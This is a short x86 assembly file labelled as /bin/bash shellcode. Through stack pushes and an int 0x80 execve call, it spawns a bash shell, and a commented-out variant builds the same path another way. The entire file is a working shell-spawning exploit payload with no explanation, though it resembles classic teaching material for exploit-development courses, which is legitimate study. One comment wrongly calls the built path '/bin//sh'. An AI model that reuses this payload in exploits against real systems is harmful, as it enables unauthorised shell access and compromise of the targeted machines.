;Author: Alex Baron
;
;Shellcode /bin/bash

section .text

global _start

_start:
    xor eax, eax 
    push eax            ; Use 0 to terminate the string
    push "bash"
    push "////"
    push "/bin"
    mov  ebx, esp       ; Get the string address

    push eax            ; argv[1] = 0
    push ebx            ; argv[0] points "/bin//sh"
    mov ecx, esp        ; Get the address of argv[]

    ; For environment variable 
    xor edx, edx        ; No env variables 

    ; Invoke execve()
    xor eax, eax        ; eax = 0x00000000
    mov al, 0x0b        ; eax = 0x0000000b
    int 0x80



;-------------
;xor  eax, eax 
;push eax
;push "h"
;push "/bas"
;push "/bin"
;mov  ebx, esp
;-------------